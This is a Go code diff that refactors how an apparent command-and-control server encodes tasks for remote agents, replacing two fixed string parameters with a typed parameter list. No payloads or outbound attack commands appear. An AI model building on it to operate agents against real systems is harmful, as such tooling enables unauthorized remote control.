@@ -5,7 +5,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io"
-	"strconv"
+	//"strconv"
 
 	"github.com/z3vxo/kronos/internal/database"
 	"github.com/z3vxo/kronos/internal/files"
@@ -71,7 +71,7 @@ func WriteString(w io.Writer, str string) error {
 func processUploadCmd(cmd database.Task, fileMgr *files.Manager) ([]byte, error) {
 	var tmp bytes.Buffer
 
-	uuid := cmd.Param2
+	uuid := cmd.Metadata
 	entry, ok := fileMgr.Uploads[uuid]
 	if !ok {
 		return nil, fmt.Errorf("upload entry not found: %s", uuid)
@@ -157,7 +157,7 @@ func CraftAgentResponse(Tasks []database.Task, FileMgr *files.Manager) ([]byte, 
 }
 
 
-func CraftCmdFormat(code, TaskID uint32, param1, param2, DataType string) ([]byte, error) {
+func CraftCmdFormat(code, TaskID uint32, Params []Param) ([]byte, error) {
 	var buffer bytes.Buffer
 
 	if err := Write4(&buffer, code); err != nil {
@@ -167,44 +167,19 @@ func CraftCmdFormat(code, TaskID uint32, param1, param2, DataType string) ([]byt
 		return nil, err
 	}
 
-
-	if param1 == "" && param2 == "" {
-		return buffer.Bytes(), nil
-	}
-
-	if DataType == "int" {
-
-		val, err := strconv.Atoi(param1)
-		if err != nil {
-			return nil, err
-		}
-		if err := Write4(&buffer, uint32(val)); err != nil {
-			return nil, err
-		}
-
-		if param2 != "" {
-			val2, err := strconv.Atoi(param2)
-			if err != nil {
+	for _, p := range Params {
+		switch p.DataType {
+		case "int":
+			if err := Write4(&buffer, uint32(p.Value.(float64))); err != nil {
 				return nil, err
 			}
-			if err := Write4(&buffer, uint32(val2)); err != nil {
+		case "string":
+			if err := WriteString(&buffer, p.Value.(string)); err != nil {
 				return nil, err
 			}
 		}
-	} else {
-		if param1 != "" {
-			if err := WriteString(&buffer, param1); err != nil {
-				return nil, err
-			}
-		}
-		if param2 != "" {
-			if err := WriteString(&buffer, param2); err != nil {
-				return nil, err
-			}
-		}
+
 	}
 
 	return buffer.Bytes(), nil
-
-
 }
